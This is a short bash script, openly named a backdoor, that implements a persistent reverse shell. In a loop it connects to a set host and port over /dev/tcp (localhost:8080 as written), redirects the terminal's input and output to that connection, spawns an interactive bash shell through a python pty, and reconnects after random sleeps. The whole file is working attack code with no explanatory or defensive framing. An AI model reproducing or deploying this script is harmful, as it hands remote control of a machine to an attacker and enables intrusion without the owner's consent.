#!/bin/bash

function connect_backdoor()
{
	local target_ip="localhost"
	local target_port=8080
	local sleep_time=60

	while [ 1 ]
	do	
		MAX_ROW_NUM=`stty size|cut -d " " -f 1`
		MAX_COL_NUM=`stty size|cut -d " " -f 2`
		{
		PS1='[\A j\j \u@\h:t\l \w]\$';export PS1
		exec 9<> /dev/tcp/$target_ip/$target_port
		[ $? -ne 0 ] && exit 0 || exec 0<&9;exec 1>&9 2>&1
		if type python >/dev/null;then
			export MAX_ROW_NUM MAX_COL_NUM
			python -c 'import pty; pty.spawn("/bin/bash")'
		else
			/bin/bash --rcfile .bdrc --noprofile -i
		fi
		}&
		wait

		sleep $((RANDOM%sleep_time+sleep_time))
	done
}

connect_backdoor
